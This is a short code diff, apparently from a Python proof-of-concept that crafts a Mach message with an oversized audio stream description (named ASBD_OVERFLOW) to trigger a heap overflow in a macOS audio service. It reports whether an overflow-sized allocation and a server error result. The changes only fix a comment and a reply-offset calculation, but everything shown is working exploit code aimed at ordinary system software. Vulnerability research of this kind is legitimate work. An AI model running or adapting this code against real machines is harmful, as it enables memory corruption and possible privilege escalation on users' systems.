@@ -70,7 +70,7 @@ ASBD_OVERFLOW = struct.pack('<dIIIIIIII',
 assert len(ASBD_OVERFLOW) == 40, len(ASBD_OVERFLOW)
 
 # Initialize message: non-complex, msg_id=0x157c3, size=0x78
-# req[0x20]=nc_hndl, req[0x24]=0, req[0x28]=ASBD1, req[0x50]=ASBD2
+# req[0x18]=NDR, req[0x20]=nc_hndl, req[0x28]=ASBD1, req[0x50]=ASBD2
 buf = bytearray(0x200)
 struct.pack_into('<IIIIII', buf, 0x00,
     SO_BITS, 0x78, svc.value, rp, 0, 0x157c3)
@@ -120,8 +120,7 @@ else:
             print(f"    normal-sized allocation (no overflow)")
     # RetCode lives after all descriptors: NDR(8) + RetCode(4)
     retcode_off = 0x1c + in_dcnt * 16
-    ndr_off = retcode_off
-    retcode = struct.unpack_from('<i', buf, ndr_off + 8)[0]
+    retcode = struct.unpack_from('<i', buf, retcode_off + 8)[0]
     print(f"  RetCode={retcode:#010x}")
     if retcode != 0:
         print(f"  Server-side error despite complex reply: {retcode:#010x}")
